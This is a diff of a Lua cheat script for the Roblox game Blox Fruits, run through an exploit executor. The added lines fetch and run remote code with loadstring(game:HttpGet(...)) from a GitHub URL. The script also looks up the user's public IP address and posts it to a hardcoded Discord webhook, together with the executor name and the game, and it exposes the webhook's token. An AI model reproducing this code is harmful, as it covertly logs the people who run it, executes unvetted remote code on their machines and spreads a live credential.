@@ -10,29 +10,37 @@ for i=1,#__LUABLE["Functions"] do
 end
 --__Team = {}
 --__Team.Select = Config["Team"] or "p"
-local Value_Game = "Blox Fruits"
-local WebhookUrl = 'https://discord.com/api/webhooks/1218168899434975292/8ihet3SCRq4RQJ_fXduTCH7YP3kbJu7JK1LPirx5LSsDbOL_H5CyZpDDZPUkCJl-XnZ8'
+__A = {}
+__A.Api = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoiIntra/Api/main/Luable/__CheckGame.lua"))()
+-- Setting
+__A.Value_Game = tostring(__A.Api:Game())
+__A.WebhookUrl = 'https://discord.com/api/webhooks/1218168899434975292/8ihet3SCRq4RQJ_fXduTCH7YP3kbJu7JK1LPirx5LSsDbOL_H5CyZpDDZPUkCJl-XnZ8'
+
+-- Script
 __A.Executor = identifyexecutor()
 __A.RoExec = function()
     if tostring(__A.Executor) == "Krampus" then
-        Executor_Name = "RO-EXEC"
         return true
     else
-        Executor_Name = tostring(Executor)
         return false
     end
 end
-local HttpService = game:GetService("HttpService")
-local requestt = http_request or request or syn.request
-local body = requestt({Url = "https://httpbin.org/get"; Method = "GET"}).Body;
-local decoded = game:GetService("HttpService"):JSONDecode(body)
-local ip = decoded.origin
-local PlaceID = game.PlaceId
-local Path = "http://www.roblox.com/asset/?id="
-local headers = {
+if __A.RoExec() then
+    __A.Executor_Name = "RO-EXEC"
+else
+    __A.Executor_Name = tostring(__A.Executor)
+end
+__A.HttpService = game:GetService("HttpService")
+__A.requestt = http_request or request or syn.request
+__A.body = __A.requestt({Url = "https://httpbin.org/get"; Method = "GET"}).Body;
+__A.decoded = game:GetService("HttpService"):JSONDecode(__A.body)
+__A.ip = __A.decoded.origin
+__A.PlaceID = game.PlaceId
+__A.Path = "http://www.roblox.com/asset/?id="
+__A.headers = {
     ["Content-Type"] = "application/json"
 }   
-local data = {
+__A.data = {
     ["embeds"] = {
         {
             ["title"] = "Alchemy Webhook",
@@ -49,12 +57,12 @@ local data = {
                 },
                 {
                     ["name"] = 'IP',
-                    ["value"] = "╰―[ ||"..tostring(ip).."|| ]",
+                    ["value"] = "╰―[ ||"..tostring(__A.ip).."|| ]",
                     ["inline"] = true
                 },
                 {
                     ["name"] = 'Executor',
-                    ["value"] = "╰― "..Executor_Name,
+                    ["value"] = "╰― "..__A.Executor_Name,
                     ["inline"] = true
                 },
                 {
@@ -64,7 +72,7 @@ local data = {
                 },
                 {
                     ["name"] = 'Game',
-                    ["value"] = "╰― "..Value_Game,
+                    ["value"] = "╰― "..__A.Value_Game,
                     ["inline"] = false
                 },
                 {
@@ -86,8 +94,8 @@ local data = {
         }
     }
 }
-local newdata = HttpService:JSONEncode(data)
-requestt({Url = WebhookUrl, Body = newdata, Method = "POST", Headers = headers})
+__A.newdata = __A.HttpService:JSONEncode(__A.data)
+__A.requestt({Url = __A.WebhookUrl, Body = __A.newdata, Method = "POST", Headers = __A.headers})
 __VE = {
     ["Ps"] = game:GetService("Players"),
     ["LPs"] = game:GetService("Players").LocalPlayer,
